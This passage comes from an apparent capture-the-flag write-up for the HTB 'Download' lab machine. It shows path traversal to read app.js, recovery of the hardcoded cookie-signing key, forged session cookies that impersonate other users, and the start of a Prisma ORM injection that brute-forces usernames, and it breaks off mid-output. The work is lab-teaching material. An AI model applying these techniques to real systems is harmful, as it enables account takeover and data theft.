+    <span class="s2">"prisma"</span><span class="p">:</span> <span class="s2">"^4.13.0"</span><span class="p">,</span>
+    <span class="s2">"ts-node"</span><span class="p">:</span> <span class="s2">"^10.9.1"</span><span class="p">,</span>
+    <span class="s2">"typescript"</span><span class="p">:</span> <span class="s2">"^5.0.4"</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+It reveals an author named <code>WESLEY</code>, which could potentially be a system username. This is a valuable piece of information to keep in mind. Additionally, the main script of the website is disclosed as <code>app.js</code>.<br/><br/>
+Let's attempt to list the content of <code>app.js</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">app.js'</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="s2">"use strict"</span><span class="p">;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">__importDefault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">__importDefault</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">mod</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">mod</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">mod</span><span class="p">.</span><span class="nx">__esModule</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">mod</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">"default"</span><span class="o">:</span><span class="w"> </span><span class="nx">mod</span><span class="w"> </span><span class="p">};</span>
+<span class="p">};</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">exports</span><span class="p">,</span><span class="w"> </span><span class="s2">"__esModule"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">express_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"express"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">nunjucks_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"nunjucks"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">path_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"path"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">cookie_parser_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"cookie-parser"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">cookie_session_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"cookie-session"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">flash_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"./middleware/flash"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">auth_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"./routers/auth"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">files_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"./routers/files"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">home_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">__importDefault</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s2">"./routers/home"</span><span class="p">));</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">client_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">"@prisma/client"</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">express_1</span><span class="p">.</span><span class="k">default</span><span class="p">)();</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3000</span><span class="p">;</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">client_1</span><span class="p">.</span><span class="nx">PrismaClient</span><span class="p">();</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nunjucks_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">configure</span><span class="p">(</span><span class="nx">path_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span><span class="w"> </span><span class="s2">"views"</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">autoescape</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">express</span><span class="o">:</span><span class="w"> </span><span class="nx">app</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">noCache</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="p">});</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">cookie_session_1</span><span class="p">.</span><span class="k">default</span><span class="p">)({</span>
+<span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"download_session"</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">keys</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"8929874489719802418902487651347865819634518936754"</span><span class="p">],</span>
+<span class="w">    </span><span class="nx">maxAge</span><span class="o">:</span><span class="w"> </span><span class="mf">7</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">24</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">,</span>
+<span class="p">}));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">flash_1</span><span class="p">.</span><span class="k">default</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="w"> </span><span class="nx">extended</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">}));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">cookie_parser_1</span><span class="p">.</span><span class="k">default</span><span class="p">)());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">"/static"</span><span class="p">,</span><span class="w"> </span><span class="nx">express_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="k">static</span><span class="p">(</span><span class="nx">path_1</span><span class="p">.</span><span class="k">default</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span><span class="w"> </span><span class="s2">"static"</span><span class="p">)));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">"index.njk"</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">"/files"</span><span class="p">,</span><span class="w"> </span><span class="nx">files_1</span><span class="p">.</span><span class="k">default</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">"/auth"</span><span class="p">,</span><span class="w"> </span><span class="nx">auth_1</span><span class="p">.</span><span class="k">default</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">"/home"</span><span class="p">,</span><span class="w"> </span><span class="nx">home_1</span><span class="p">.</span><span class="k">default</span><span class="p">);</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">"*"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">"error.njk"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">statusCode</span><span class="o">:</span><span class="w"> </span><span class="mf">404</span><span class="w"> </span><span class="p">});</span>
+<span class="p">});</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">NODE_ENV</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"production"</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s2">"0.0.0.0"</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Listening on "</span><span class="p">,</span><span class="w"> </span><span class="nx">port</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">NODE_ENV</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"production"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">$executeRawUnsafe</span><span class="p">(</span><span class="sb">`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`</span><span class="p">);</span>
+<span class="w">        </span><span class="p">},</span><span class="w"> </span><span class="mf">300000</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">});</span>
+</pre></div>
+
+This appears to be the source code of the website and the main script. As it corresponds to the main file of the website, it reveals additional routes to other scripts and files.<br/><br/>
+Notably, we can highlight the presence of the <code>secret</code> used to sign cookies. This could be valuable for discovering new users.<br/><br/>
+It's worth mentioning that the website utilizes Prisma Client.<br/><br/>
+Prisma Client is a database access tool used with the Object-Relational Mapping (ORM) Prisma. Prisma Client simplifies database queries by providing a programming interface in the programming language you are using (e.g., JavaScript or TypeScript).<br/><br/>
+An ORM simplifies data manipulation in a relational database by allowing developers to work with objects and classes in their code, abstracting the complexity of SQL queries and simplifying database operations. This makes application development easier by providing a layer of abstraction between the code and the underlying database.<br/><br/>
+Understanding this concept could be beneficial for manipulating cookies, given that we have the <code>secret</code> key.<br/><br/>
+<h3><br>Cookie-monster</br></h3><br>
+With the tool <a href="https://github.com/DigitalInterruption/cookie-monster">cookie-monster</a>, we can generate and sign new cookies with the desired information.<br/><br/>
+The usage of this tool involves playing with parameters such as <code>-e</code>, <code>-k</code>, <code>-f</code>, and <code>-n</code>.<br/><br/>
+Firstly, we need to save our cookie in JSON format in a JSON file:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">}}</span>
+</pre></div>
+
+Given that we don't know any usernames, I will only modify the ID number to 1:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">}}</span>
+</pre></div>
+
+Now I will sign it using <code>cookie-monster</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+               <span class="n">_</span>  <span class="n">_</span>
+             <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
+    <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
+   <span class="o">/</span><span class="p">:::</span>\ <span class="o">/</span> <span class="p">,</span><span class="n">_________</span><span class="p">,</span>  \
+  <span class="o">/</span>\<span class="p">:::</span><span class="o">/</span> \  <span class="s1">'. (:::/  `'</span><span class="o">-</span><span class="p">;</span>
+  \ <span class="err">`</span><span class="o">-</span><span class="s1">'`\ '</span><span class="o">.</span><span class="n">_</span> <span class="err">`</span><span class="s2">"'"</span><span class="s1">'\__    </span><span class="se">\</span>
+<span class="s1">   `'</span><span class="o">-.</span>  \   <span class="err">`</span><span class="p">)</span><span class="o">-=-=</span><span class="p">(</span>  <span class="err">`</span><span class="p">,</span>   <span class="o">|</span>
+       \  <span class="err">`</span><span class="o">-</span><span class="s2">"`      `"</span><span class="o">-</span><span class="err">`</span>   <span class="o">/</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Data</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">=</span><span class="n">eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MSwidXNlcm5hbWUiOiJlbHN3aXgifX0</span><span class="o">=</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Signature</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="o">=</span><span class="n">iYBGt7aCtH</span><span class="o">-</span><span class="n">Hfmu5gBv4vQxfcbY</span>
+</pre></div>
+
+It appears to be working correctly. Let's replace our old cookies with the new ones:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/21.png"/><br/><br/>
+When reloading the page, it says <code>No files found</code>, and it didn't redirect us to the <code>/login</code> section. I believe the new cookies are functioning properly. However, to access the files associated with the <code>id</code> 1, we may need to know the corresponding username.<br/><br/>
+I'm considering removing our username from the cookie and leaving it only with the <code>id</code> number:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">}}</span>
+</pre></div>
+
+After that, I signed the new cookie with <code>cookie-monster</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+               <span class="n">_</span>  <span class="n">_</span>
+             <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
+    <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
+   <span class="o">/</span><span class="p">:::</span>\ <span class="o">/</span> <span class="p">,</span><span class="n">_________</span><span class="p">,</span>  \
+  <span class="o">/</span>\<span class="p">:::</span><span class="o">/</span> \  <span class="s1">'. (:::/  `'</span><span class="o">-</span><span class="p">;</span>
+  \ <span class="err">`</span><span class="o">-</span><span class="s1">'`\ '</span><span class="o">.</span><span class="n">_</span> <span class="err">`</span><span class="s2">"'"</span><span class="s1">'\__    </span><span class="se">\</span>
+<span class="s1">   `'</span><span class="o">-.</span>  \   <span class="err">`</span><span class="p">)</span><span class="o">-=-=</span><span class="p">(</span>  <span class="err">`</span><span class="p">,</span>   <span class="o">|</span>
+       \  <span class="err">`</span><span class="o">-</span><span class="s2">"`      `"</span><span class="o">-</span><span class="err">`</span>   <span class="o">/</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Data</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">=</span><span class="n">eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MX19</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Signature</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="o">=</span><span class="n">L</span><span class="o">-</span><span class="n">CbUTci83X7NoHNhIVqKhBCSDg</span>
+</pre></div>
+
+Upon replacing the new cookies, it returned different content in the response:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/22.png"/><br/><br/>
+Now I'm seeing files from another user called <code>WESLEY</code>, indicating a successful impersonation of his account.<br/><br/>
+Let's observe what happens if we leave the <code>id</code> field empty:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:{}}}</span>
+</pre></div>
+
+Now, let's sign the cookie using <code>cookie-monster</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+               <span class="n">_</span>  <span class="n">_</span>
+             <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
+    <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
+   <span class="o">/</span><span class="p">:::</span>\ <span class="o">/</span> <span class="p">,</span><span class="n">_________</span><span class="p">,</span>  \
+  <span class="o">/</span>\<span class="p">:::</span><span class="o">/</span> \  <span class="s1">'. (:::/  `'</span><span class="o">-</span><span class="p">;</span>
+  \ <span class="err">`</span><span class="o">-</span><span class="s1">'`\ '</span><span class="o">.</span><span class="n">_</span> <span class="err">`</span><span class="s2">"'"</span><span class="s1">'\__    </span><span class="se">\</span>
+<span class="s1">   `'</span><span class="o">-.</span>  \   <span class="err">`</span><span class="p">)</span><span class="o">-=-=</span><span class="p">(</span>  <span class="err">`</span><span class="p">,</span>   <span class="o">|</span>
+       \  <span class="err">`</span><span class="o">-</span><span class="s2">"`      `"</span><span class="o">-</span><span class="err">`</span>   <span class="o">/</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Data</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">=</span><span class="n">eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6e319fQ</span><span class="o">==</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Signature</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="o">=</span><span class="n">ogGsbzlrwcNYnAVlB7V5BRsm43U</span>
+</pre></div>
+
+Upon replacing the cookies, it returned a substantial amount of content:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/23.png"/><br/><br/>
+There are numerous new users, but currently, we can't perform any actions with them.<br/><br/>
+Considering that the website uses Prisma Client to interact with the database, I began contemplating the possibility of ORM injection in the cookie.<br/><br/>
+In the context of ORM, queries are typically constructed using methods and functions provided by the ORM library. However, if the application fails to adequately validate or filter user-supplied data before using it in these queries, we might manipulate parameters to execute undesired queries or even perform harmful actions in the database.<br/><br/>
+After reading some <a href="https://www.prisma.io/docs/reference/api-reference/prisma-client-reference">Prisma documentation</a>, I found some functions we can use to extract data from the database.<br/><br/>
+While the primary purpose of these functions is not data extraction, several of them can be utilized to our advantage to obtain information from the database.<br/><br/>
+Among the various functions available, I stumbled upon one that seemed interesting to experiment with. This function or method is <code>startsWith</code>, which, during the execution of the SQL query, validates the character passed as an argument and compares it.<br/><br/>
+To illustrate better, I will create a sample query and explain it:<br/><br/>
+<div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="n">startsWith</span><span class="p">(</span><span class="s1">'A'</span><span class="p">)</span>
+</pre></div>
+
+This query is selecting data stored in the <code>age</code> column of the <code>users</code> table and is filtering exclusively for strings that start with the character <code>A</code> in the <code>username</code> column.<br/><br/>
+In other words, it is selecting the ages of all usernames that start with the letter <code>A</code>. At the SQL level, this may not work, but the <code>startsWith</code> function, being included in Prisma, automates the process of searching for string matches that begin with the character <code>A</code>.<br/><br/>
+If we can modify the cookie and apply the invocation of these methods, we could attempt to gather information about users through a brute-force attack.<br/><br/>
+To illustrate, we will conduct a test to try accessing files uploaded by all users whose usernames begin with the character <code>a</code>.<br/><br/>
+Next, we will prepare the cookie we will sign:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"username"</span><span class="p">:{</span><span class="s2">"startsWith"</span><span class="p">:</span><span class="s2">"A"</span><span class="p">}}}</span>
+</pre></div>
+
+As you can see, I removed the ID field and kept the <code>username</code> field. I also added the invocation of the <code>startsWith</code> method with the parameter <code>A</code>. If everything works as expected, we should see all files uploaded on the website by users whose usernames start with the <code>A</code> character.<br/><br/>
+Now, let's sign the cookie:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+               <span class="n">_</span>  <span class="n">_</span>
+             <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
+    <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
+   <span class="o">/</span><span class="p">:::</span>\ <span class="o">/</span> <span class="p">,</span><span class="n">_________</span><span class="p">,</span>  \
+  <span class="o">/</span>\<span class="p">:::</span><span class="o">/</span> \  <span class="s1">'. (:::/  `'</span><span class="o">-</span><span class="p">;</span>
+  \ <span class="err">`</span><span class="o">-</span><span class="s1">'`\ '</span><span class="o">.</span><span class="n">_</span> <span class="err">`</span><span class="s2">"'"</span><span class="s1">'\__    </span><span class="se">\</span>
+<span class="s1">   `'</span><span class="o">-.</span>  \   <span class="err">`</span><span class="p">)</span><span class="o">-=-=</span><span class="p">(</span>  <span class="err">`</span><span class="p">,</span>   <span class="o">|</span>
+       \  <span class="err">`</span><span class="o">-</span><span class="s2">"`      `"</span><span class="o">-</span><span class="err">`</span>   <span class="o">/</span>
+
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Data</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">=</span><span class="n">eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJ1c2VybmFtZSI6eyJzdGFydHNXaXRoIjoiQSJ9fX0</span><span class="o">=</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Signature</span> <span class="n">Cookie</span><span class="p">:</span> <span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="o">=</span><span class="n">bI89MIMG1P226_VRwmajlBlSroA</span>
+</pre></div>
+
+For this attempt, I will use cURL to filter by the string <code>uploaded by</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/home/'</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJ1c2VybmFtZSI6eyJzdGFydHNXaXRoIjoiQSJ9fX0=; download_session.sig=bI89MIMG1P226_VRwmajlBlSroA"</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'uploaded by'</span> <span class="o">-</span><span class="n">i</span>
+        <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">AyufmApogee</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
